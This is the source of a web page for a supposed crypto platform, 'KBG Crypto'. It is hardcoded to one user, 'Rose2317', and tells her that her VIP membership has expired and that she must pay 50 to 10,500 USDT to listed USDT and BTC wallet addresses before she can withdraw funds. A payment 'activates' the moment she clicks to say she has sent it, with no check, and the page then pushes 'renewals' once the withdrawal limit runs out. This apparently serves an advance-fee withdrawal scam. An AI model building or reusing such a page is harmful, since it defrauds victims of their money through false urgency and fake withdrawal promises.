<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Membership Upgrade - KBG Crypto</title>

    <script>
    // Protect all pages - redirect to login if not authenticated
    if (!localStorage.getItem('currentUser')) {
        window.location.href = 'index.html';
    } else {
        const user = JSON.parse(localStorage.getItem('currentUser'));
        // Optional: extra check (in case someone tampers with storage)
        if (user.username !== "Rose2317") {
            localStorage.removeItem('currentUser');
            window.location.href = 'index.html';
        }
    }
    </script>

    
    <link rel="stylesheet" href="styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <!-- Toastr CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
    <style>



        .modal-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: rgba(0, 0, 0, 0.7);
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 9999;
}

        .modal-content {
    position: relative;
    z-index: 10000;
}
        
        /* Add new styles for updated system */
        .withdraw-limit-tag {
            background: rgba(56, 178, 172, 0.2);
            color: #38b2ac;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
            margin: 10px 0;
            display: inline-block;
        }
        
        .membership-card.vip5.premium {
            border: 2px solid #f59e0b;
            background: linear-gradient(145deg, rgba(15, 23, 42, 0.9), rgba(30, 41, 59, 0.9));
            position: relative;
        }
        
        .membership-card.vip5.premium::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, #f59e0b, #d97706, #fbbf24, #f59e0b);
            border-radius: 20px;
            z-index: -1;
            animation: premiumGlow 3s infinite;
        }
        
        @keyframes premiumGlow {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 0.8; }
        }
        
        .vip5 .diamond-icon {
            color: #f59e0b;
        }
        
        .vip5 .price-tag {
            color: #fbbf24;
            font-weight: 800;
        }
        
        .renew-section {
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .btn-renew {
            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
            border: none;
            border-radius: 12px;
            color: white;
            padding: 12px 20px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            transition: all 0.3s;
        }
        
        .btn-renew:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(245, 158, 11, 0.4);
        }
        
        .expired-notice {
            background: rgba(220, 38, 38, 0.1);
            border: 1px solid rgba(220, 38, 38, 0.3);
            border-radius: 8px;
            padding: 10px;
            margin-top: 10px;
            color: #fca5a5;
            font-size: 0.85rem;
            text-align: center;
        }
        
        .expired-tag {
            background: #dc2626;
            color: white;
            padding: 3px 8px;
            border-radius: 12px;
            font-size: 0.7rem;
            font-weight: 700;
            margin-left: 5px;
            vertical-align: middle;
        }
        
        .current-plan-badge {
            background: rgba(56, 178, 172, 0.2);
            color: #38b2ac;
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 0.8rem;
            font-weight: 600;
            margin-top: 5px;
        }
        
        /* Payment Modal Styles - UPDATED FOR MOBILE RESPONSIVE */
        .payment-modal {
            background: linear-gradient(145deg, #0f172a, #1e293b);
            border-radius: 20px;
            padding: 0;
            overflow: hidden;
            max-width: 95%;
            width: 95%;
            margin: 0 auto;
        }
        
        .payment-header {
            background: rgba(0, 212, 170, 0.1);
            padding: 20px 15px;
            text-align: center;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .payment-amount {
            font-size: 2rem;
            font-weight: 800;
            color: white;
            margin: 10px 0;
        }
        
        .payment-plan {
            color: #a0aec0;
            font-size: 1rem;
        }
        
        .payment-methods {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin: 15px 0;
            flex-wrap: wrap;
        }
        
        .payment-method-btn {
            background: rgba(30, 41, 59, 0.7);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 12px 15px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            flex: 1;
            min-width: 120px;
            font-size: 0.9rem;
            transition: all 0.3s;
        }
        
        @media (max-width: 480px) {
            .payment-method-btn {
                min-width: 100px;
                padding: 10px 12px;
                font-size: 0.85rem;
            }
        }
        
        .payment-method-btn.active {
            background: rgba(56, 178, 172, 0.2);
            border-color: #38b2ac;
        }
        
        .payment-details {
            padding: 15px;
            max-height: 70vh;
            overflow-y: auto;
        }
        
        .wallet-section {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 15px;
        }
        
        .wallet-section h3 {
            color: white;
            margin-bottom: 12px;
            font-size: 1.1rem;
        }
        
        .wallet-address {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 12px;
            font-family: 'Courier New', monospace;
            color: white;
            word-break: break-all;
            margin: 10px 0;
            cursor: pointer;
            font-size: 0.85rem;
            line-height: 1.4;
        }
        
        @media (max-width: 480px) {
            .wallet-address {
                font-size: 0.8rem;
                padding: 10px;
            }
        }
        
        .wallet-address:hover {
            background: rgba(0, 0, 0, 0.4);
        }
        
        .qr-container {
            text-align: center;
            margin: 15px 0;
        }
        
        .qr-code {
            width: 130px;
            height: 130px;
            border-radius: 8px;
            display: inline-block;
        }
        
        @media (max-width: 480px) {
            .qr-code {
                width: 110px;
                height: 110px;
            }
        }
        
        .btc-info {
            background: rgba(245, 158, 11, 0.1);
            border: 1px solid rgba(245, 158, 11, 0.2);
            border-radius: 8px;
            padding: 12px;
            margin-top: 12px;
        }
        
        .btc-price-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }
        
        .btc-price-row:last-child {
            margin-bottom: 0;
        }
        
        .btc-price {
            color: #fbbf24;
            font-weight: 700;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
        }
        
        .instruction-box {
            background: rgba(245, 158, 11, 0.1);
            border-radius: 8px;
            padding: 12px;
            margin-top: 15px;
        }
        
        .instruction-box h4 {
            color: #fbbf24;
            margin-bottom: 8px;
            font-size: 0.95rem;
        }
        
        .instruction-list {
            color: #a0aec0;
            padding-left: 20px;
            margin: 0;
            font-size: 0.85rem;
        }
        
        .instruction-list li {
            margin-bottom: 5px;
            line-height: 1.4;
        }
        
        .instruction-list li:last-child {
            margin-bottom: 0;
        }
        
        .payment-actions {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        
        @media (max-width: 480px) {
            .payment-actions {
                flex-direction: column;
                gap: 8px;
            }
        }
        
        .btn-secondary, .btn-primary {
            flex: 1;
            padding: 14px;
            border-radius: 10px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            font-size: 0.95rem;
            transition: all 0.3s;
        }
        
        .btn-secondary {
            background: rgba(71, 85, 105, 0.7);
            color: white;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #00d4aa 0%, #009688 100%);
            color: white;
        }
        
        /* Alert Popup Styles */
        .alert-popup {
            background: linear-gradient(145deg, #0f172a, #1e293b);
            border-radius: 20px;
            padding: 30px 25px;
            max-width: 95%;
            width: 95%;
            margin: 0 auto;
            text-align: center;
            border: 2px solid rgba(0, 212, 170, 0.3);
        }
        
        .alert-icon {
            font-size: 3.5rem;
            color: #00d4aa;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .alert-title {
            color: white;
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 15px;
        }
        
        .alert-message {
            color: #a0aec0;
            font-size: 1rem;
            line-height: 1.6;
            margin-bottom: 25px;
        }
        
        .alert-important {
            background: rgba(245, 158, 11, 0.1);
            border: 1px solid rgba(245, 158, 11, 0.2);
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
            text-align: left;
        }
        
        .alert-important-title {
            color: #fbbf24;
            font-size: 1.1rem;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .alert-important-text {
            color: #a0aec0;
            line-height: 1.5;
            font-size: 0.95rem;
        }
        
        .alert-close-btn {
            background: linear-gradient(135deg, #00d4aa 0%, #009688 100%);
            color: white;
            border: none;
            border-radius: 10px;
            padding: 15px 30px;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            transition: all 0.3s;
        }
        
        .alert-close-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 212, 170, 0.4);
        }
    </style>
</head>
<body>
    <div class="app-container">
        <header class="app-header">
            <div class="header-left">
                <button class="back-btn" onclick="window.history.back()">‚Üê</button>
            </div>
            <div class="header-center">Membership Upgrade</div>
        </header>

        <!-- Urgent Alert Banner -->
        <div class="urgent-alert-banner">
            <div class="urgent-icon">‚ö†Ô∏è</div>
            <h3>Immediate Action Required!</h3>
            <p>Your current Vip membership has expired. All VIP benefits are currently suspended.</p>
            <p>Renew immediately to restore full access and continue enjoying VIP privileges.</p>
        </div>

        <div class="membership-container">
            <!-- V1 -->
            <div class="membership-card vip1">
                <div class="vip-badge-large">V1</div>
                <div class="diamond-icon">üíé</div>
                <div class="price-tag">50.00 USDT</div>
                <div class="withdraw-limit-tag">Withdraw: $30 (One-time)</div>
                <button class="btn-purchase" data-plan="v1" data-amount="50.00" data-withdraw-limit="30">Purchase</button>
                <div class="vip-details">
                    <p class="withdraw-limit-bold">
                        <strong>Withdraw limit up to</strong> <span class="highlight-limit">30 USDT</span>
                    </p>
                    <ul class="benefits-list">
                        <li>Basic 24/7 Support</li>
                        <li>Standard trading tools</li>
                        <li>1.5% trading fees</li>
                        <li>One-time withdrawal</li>
                    </ul>
                </div>
                <div class="renew-section" id="v1-renew" style="display: none;"></div>
            </div>

            <!-- V2 -->
            <div class="membership-card vip2">
                <div class="vip-badge-large">V2</div>
                <div class="diamond-icon">üíé</div>
                <div class="price-tag">1,000.00 USDT</div>
                <div class="withdraw-limit-tag">Withdraw: $50,000 (One-time)</div>
                <button class="btn-purchase" data-plan="v2" data-amount="1000.00" data-withdraw-limit="50000">Purchase</button>
                <div class="vip-details">
                    <p class="withdraw-limit-bold">
                        <strong>Withdraw limit up to</strong> <span class="highlight-limit">50,000 USDT</span>
                    </p>
                    <ul class="benefits-list">
                        <li>Enhanced Support (Chat + Email)</li>
                        <li>Advanced charting tools</li>
                        <li>1.2% trading fees</li>
                        <li>Weekly market insights</li>
                        <li>One-time withdrawal</li>
                    </ul>
                </div>
                <div class="renew-section" id="v2-renew" style="display: none;"></div>
            </div>

            <!-- V3 -->
            <div class="membership-card vip3">
                <div class="vip-badge-large">V3</div>
                <div class="diamond-icon">üíé</div>
                <div class="price-tag">3,000.00 USDT</div>
                <div class="withdraw-limit-tag">Withdraw: $150,000 (One-time)</div>
                <button class="btn-purchase" data-plan="v3" data-amount="3000.00" data-withdraw-limit="150000">Purchase</button>
                <div class="vip-details">
                    <p class="withdraw-limit-bold">
                        <strong>Withdraw limit up to</strong> <span class="highlight-limit">150,000 USDT</span>
                    </p>
                    <ul class="benefits-list">
                        <li>Priority Support (Dedicated Line)</li>
                        <li>Pro-level analytics</li>
                        <li>0.8% trading fees</li>
                        <li>Daily premium signals</li>
                        <li>Early access to new features</li>
                        <li>One-time withdrawal</li>
                    </ul>
                </div>
                <div class="renew-section" id="v3-renew" style="display: none;"></div>
            </div>

            <!-- V4 -->
            <div class="membership-card vip4">
                <div class="vip-badge-large">V4</div>
                <div class="diamond-icon">üíé</div>
                <div class="price-tag">5,000.00 USDT</div>
                <div class="withdraw-limit-tag">Withdraw: $500,000 (One-time)</div>
                <button class="btn-purchase" data-plan="v4" data-amount="5000.00" data-withdraw-limit="500000">Purchase</button>
                <div class="vip-details">
                    <p class="withdraw-limit-bold">
                        <strong>Withdraw limit up to</strong> <span class="highlight-limit">500,000 USDT</span>
                    </p>
                    <ul class="benefits-list">
                        <li>Priority 24/7 VIP Support</li>
                        <li>Exclusive Trading Signals</li>
                        <li>0.5% lower trading fees</li>
                        <li>Personal account manager</li>
                        <li>One-time withdrawal</li>
                    </ul>
                </div>
                <div class="renew-section" id="v4-renew" style="display: none;"></div>
            </div>

            <!-- V5 Premium -->
            <div class="membership-card vip5 premium">
                <div class="vip-badge-large">V5</div>
                <div class="diamond-icon">üëë</div>
                <div class="price-tag">10,500.00 USDT</div>
                <div class="withdraw-limit-tag">Withdraw: UNLIMITED (Monthly)</div>
                <button class="btn-purchase" data-plan="v5" data-amount="10500.00" data-withdraw-limit="999999999">Purchase</button>
                <div class="vip-details">
                    <p class="withdraw-limit-bold">
                        <strong>Withdraw limit</strong> <span class="highlight-limit">UNLIMITED</span>
                    </p>
                    <ul class="benefits-list">
                        <li>24/7 Personal VIP Manager</li>
                        <li>Institutional Trading Tools</li>
                        <li>0.1% trading fees</li>
                        <li>Real-time premium signals</li>
                        <li>Unlimited monthly withdrawals</li>
                        <li>Dedicated account protection</li>
                    </ul>
                </div>
                <div class="renew-section" id="v5-renew" style="display: none;"></div>
            </div>
        </div>
    </div>

    <!-- Payment Modal -->
    <div id="payment-modal" class="modal-overlay" style="display: none;">
        <div class="modal-content payment-modal">
            <button class="modal-close" onclick="closePaymentModal()" style="position: absolute; right: 15px; top: 15px; z-index: 10; background: rgba(0,0,0,0.5); border: none; color: white; font-size: 1.5rem; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center;">√ó</button>
            
            <div class="payment-header">
                <h2 style="color: white; margin: 0; font-size: 1.2rem;">Payment Required</h2>
                <div class="payment-amount" id="payment-amount">$50.00</div>
                <div class="payment-plan" id="payment-plan-name">V1 Plan</div>
            </div>
            
            <div class="payment-details">
                <!-- Payment Methods -->
                <div class="payment-methods">
                    <button class="payment-method-btn active" data-method="usdt" onclick="selectPaymentMethod('usdt')">
                        USDT (TRC20)
                    </button>
                    <button class="payment-method-btn" data-method="btc" onclick="selectPaymentMethod('btc')">
                        Bitcoin (BTC)
                    </button>
                </div>
                
                <!-- USDT Payment Details -->
                <div class="wallet-section" id="usdt-details">
                    <h3>Send USDT (TRC20)</h3>
                    <p style="color: #a0aec0; margin-bottom: 10px; font-size: 0.9rem;">Send exact amount to:</p>
                    
                    <div class="wallet-address" onclick="copyToClipboard('TYbNoqgjK4Zksqyo21nAsiYKzsB2aWJmbL')">
                        TYbNoqgjK4Zksqyo21nAsiYKzsB2aWJmbL
                    </div>
                    
                    <div class="qr-container">
                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TYbNoqgjK4Zksqyo21nAsiYKzsB2aWJmbL" 
                             alt="QR Code" class="qr-code">
                    </div>
                    
                    <p style="color: #fbbf24; font-size: 0.85rem; text-align: center; margin-top: 10px;">
                        ‚ö†Ô∏è Send exact amount only. Save TXID for withdrawal.
                    </p>
                </div>
                
                <!-- BTC Payment Details -->
                <div class="wallet-section" id="btc-details" style="display: none;">
                    <h3>Send Bitcoin (BTC)</h3>
                    
                    <div class="btc-info">
                        <div class="btc-price-row">
                            <span style="color: #a0aec0; font-size: 0.9rem;">Current BTC Price:</span>
                            <span class="btc-price" id="btc-price">$95,207.00</span>
                        </div>
                        <div class="btc-price-row">
                            <span style="color: #a0aec0; font-size: 0.9rem;">Amount in BTC:</span>
                            <span class="btc-price" id="btc-amount">0.000525 BTC</span>
                        </div>
                    </div>
                    
                    <p style="color: #a0aec0; margin: 12px 0 8px; font-size: 0.9rem;">Send exact BTC amount to:</p>
                    
                    <div class="wallet-address" onclick="copyToClipboard('bc1q80kd90frctf9kd6cymenftc6h767rvlw6gghms')">
                        bc1q80kd90frctf9kd6cymenftc6h767rvlw6gghms
                    </div>
                    
                    <div class="qr-container">
                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=bc1q80kd90frctf9kd6cymenftc6h767rvlw6gghms" 
                             alt="QR Code" class="qr-code">
                    </div>
                    
                    <p style="color: #fbbf24; font-size: 0.85rem; text-align: center; margin-top: 10px;">
                        ‚ö†Ô∏è Send exact BTC amount. Save TXID for withdrawal.
                    </p>
                </div>
                
                <!-- Instructions -->
                <div class="instruction-box">
                    <h4>üìã Important Instructions:</h4>
                    <ul class="instruction-list">
                        <li>Send exact amount shown above</li>
                        <li>Use correct network (TRC20 for USDT, BTC for Bitcoin)</li>
                        <li>Save Transaction ID (TXID) - Required for withdrawal</li>
                        <li>Payment verification: 5-30 minutes</li>
                        <li>Double-check address before sending</li>
                    </ul>
                </div>
                
                <!-- Action Buttons -->
                <div class="payment-actions">
                    <button class="btn-secondary" onclick="closePaymentModal()">
                        Cancel
                    </button>
                    <button class="btn-primary" onclick="confirmPayment()">
                        ‚úÖ I Have Sent Payment
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Alert Popup Modal -->
    <div id="alert-popup" class="modal-overlay" style="display: none;">
        <div class="modal-content alert-popup">
            <div class="alert-icon">‚úÖ</div>
            <h2 class="alert-title" id="alert-plan-title">Plan Activated</h2>
            <p class="alert-message" id="alert-plan-message">
                Your plan has been successfully activated. You can now withdraw funds from your account.
            </p>
            
            <div class="alert-important">
                <div class="alert-important-title">
                    <span>‚ö†Ô∏è</span>
                    <span>Important Notice</span>
                </div>
                <p class="alert-important-text">
                    <strong>Save your Transaction ID (TXID)!</strong><br>
                    You must save the Transaction ID (TXID) from your payment. 
                    This TXID is required for withdrawal verification.
                </p>
            </div>
            
            <button class="alert-close-btn" onclick="closeAlertPopup()">
                Close
            </button>
        </div>
    </div>

    <!-- Toast library -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>

    <script>
        // Get unique device ID (Persistent)
        function getDeviceId() {
            let deviceId = localStorage.getItem('deviceId');
            if (!deviceId) {
                deviceId = 'device_' + Date.now().toString(36);
                localStorage.setItem('deviceId', deviceId);
                localStorage.setItem('deviceId_timestamp', Date.now());
            }
            return deviceId;
        }

        // Get user data for this device
        function getUserData() {
            const deviceId = getDeviceId();
            const storedData = localStorage.getItem(`userData_${deviceId}`);
            
            if (!storedData) {
                return {
                    deviceId: deviceId,
                    username: "Rose2317",
                    plan: "none",
                    status: "inactive",
                    depositClaimed: 0,
                    withdrawLimit: 0,
                    withdrawUsed: 0,
                    renewAvailable: false,
                    activated: false,
                    lastUpdated: Date.now()
                };
            }
            return JSON.parse(storedData);
        }

        // Save user data with timestamp
        function saveUserData(data) {
            data.lastUpdated = Date.now();
            localStorage.setItem(`userData_${data.deviceId}`, JSON.stringify(data));
        }

        // Current payment data
        let currentPaymentData = {
            plan: '',
            amount: 0,
            withdrawLimit: 0,
            paymentMethod: 'usdt'
        };

        // BTC Price
        let btcPrice = 95207;

        // Initialize page
        function initPage() {
            updatePlanDisplay();
            fetchBTCPrice();
        }

        // Update plan display on page
        function updatePlanDisplay() {
            const userData = getUserData();
            
            if (userData.activated) {
                const currentBadge = document.createElement('div');
                currentBadge.className = 'current-plan-badge';
                currentBadge.textContent = `Current: ${userData.plan.toUpperCase()}`;
                currentBadge.id = 'current-plan-badge';
                
                document.querySelectorAll('.membership-card').forEach(card => {
                    const existingBadge = card.querySelector('#current-plan-badge');
                    if (existingBadge) existingBadge.remove();
                    
                    if (card.querySelector('.btn-purchase').dataset.plan === userData.plan) {
                        card.appendChild(currentBadge.cloneNode(true));
                    }
                });
                
                if (userData.status === "expired" || userData.renewAvailable) {
                    const renewSection = document.getElementById(`${userData.plan}-renew`);
                    if (renewSection) {
                        renewSection.style.display = 'block';
                        renewSection.innerHTML = `
                            <button class="btn-renew" onclick="upgradePlan('${userData.plan}')">
                                üîÑ Renew ${userData.plan.toUpperCase()} Plan
                            </button>
                            <div class="expired-notice">
                                Withdrawal limit exhausted. Renew for more withdrawals.
                            </div>
                        `;
                        
                        const badge = document.querySelector(`.membership-card.${userData.plan} .vip-badge-large`);
                        if (badge && !badge.querySelector('.expired-tag')) {
                            const expiredTag = document.createElement('span');
                            expiredTag.className = 'expired-tag';
                            expiredTag.textContent = 'EXPIRED';
                            badge.appendChild(expiredTag);
                        }
                    }
                }
            }
        }

        // Fetch BTC price
        async function fetchBTCPrice() {
            try {
                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
                const data = await response.json();
                if (data.bitcoin && data.bitcoin.usd) {
                    btcPrice = data.bitcoin.usd;
                    updateBTCPrice();
                }
            } catch (error) {
                updateBTCPrice();
            }
        }

        // Update BTC price display
        function updateBTCPrice() {
            document.getElementById('btc-price').textContent = `$${btcPrice.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
            
            if (currentPaymentData.amount > 0) {
                const btcAmount = currentPaymentData.amount / btcPrice;
                document.getElementById('btc-amount').textContent = btcAmount.toFixed(8) + ' BTC';
            }
        }

        // Select payment method
        function selectPaymentMethod(method) {
            currentPaymentData.paymentMethod = method;
            
            document.querySelectorAll('.payment-method-btn').forEach(btn => {
                btn.classList.remove('active');
                if (btn.dataset.method === method) btn.classList.add('active');
            });
            
            document.getElementById('usdt-details').style.display = method === 'usdt' ? 'block' : 'none';
            document.getElementById('btc-details').style.display = method === 'btc' ? 'block' : 'none';
            
            if (method === 'btc' && currentPaymentData.amount > 0) {
                const btcAmount = currentPaymentData.amount / btcPrice;
                document.getElementById('btc-amount').textContent = btcAmount.toFixed(8) + ' BTC';
            }
        }

        // Open payment modal
        function openPaymentModal(plan, amount, withdrawLimit) {
            currentPaymentData = { plan, amount, withdrawLimit, paymentMethod: 'usdt' };
            
            document.getElementById('payment-amount').textContent = `$${amount.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
            document.getElementById('payment-plan-name').textContent = `${plan.toUpperCase()} Plan`;
            
            selectPaymentMethod('usdt');
            
            const btcAmount = amount / btcPrice;
            document.getElementById('btc-amount').textContent = btcAmount.toFixed(8) + ' BTC';
            
            document.getElementById('payment-modal').style.display = 'flex';
        }

        // Close payment modal
        function closePaymentModal() {
            document.getElementById('payment-modal').style.display = 'none';
        }

        // Copy to clipboard
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                toastr.success('Address copied to clipboard!');
            });
        }

        // Confirm payment - SHOWS ALERT POPUP
        function confirmPayment() {
            // Close payment modal
            closePaymentModal();
            
            // Activate plan
            const userData = getUserData();
            
            userData.plan = currentPaymentData.plan;
            userData.status = "active";
            userData.depositClaimed = currentPaymentData.amount;
            userData.withdrawLimit = currentPaymentData.withdrawLimit;
            userData.withdrawUsed = 0;
            userData.renewAvailable = false;
            userData.activated = true;
            userData.lastUpdated = Date.now();
            
            saveUserData(userData);
            
            // Update alert popup content
            const planName = currentPaymentData.plan.toUpperCase();
            document.getElementById('alert-plan-title').textContent = `${planName} Plan Activated`;
            document.getElementById('alert-plan-message').textContent = `Your ${planName} plan has been successfully activated. You can now withdraw funds from your account.`;
            
            // Show alert popup
            document.getElementById('alert-popup').style.display = 'flex';
            
            // Update UI
            updatePlanDisplay();
        }

        // Close alert popup
        function closeAlertPopup() {
            document.getElementById('alert-popup').style.display = 'none';
        }

        // Upgrade plan
        function upgradePlan(plan) {
            const planData = {
                v1: { amount: 50, limit: 30 },
                v2: { amount: 1000, limit: 50000 },
                v3: { amount: 3000, limit: 150000 },
                v4: { amount: 5000, limit: 500000 },
                v5: { amount: 10500, limit: 999999999 }
            };
            
            if (planData[plan]) {
                openPaymentModal(plan, planData[plan].amount, planData[plan].limit);
            }
        }

        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            initPage();
            
            // Purchase button click
            document.querySelectorAll('.btn-purchase').forEach(btn => {
                btn.addEventListener('click', function() {
                    const plan = this.dataset.plan;
                    const amount = parseFloat(this.dataset.amount);
                    const withdrawLimit = parseFloat(this.dataset.withdrawLimit);
                    
                    openPaymentModal(plan, amount, withdrawLimit);
                });
            });
            
            // Close modals on outside click
            document.querySelectorAll('.modal-overlay').forEach(modal => {
                modal.addEventListener('click', function(e) {
                    if (e.target === this) {
                        this.style.display = 'none';
                    }
                });
            });
        });

        // Toast configuration
        toastr.options = {
            positionClass: 'toast-top-center',
            progressBar: true,
            timeOut: 3000,
            closeButton: true,
            newestOnTop: true
        };
    </script>

</body>
</html>
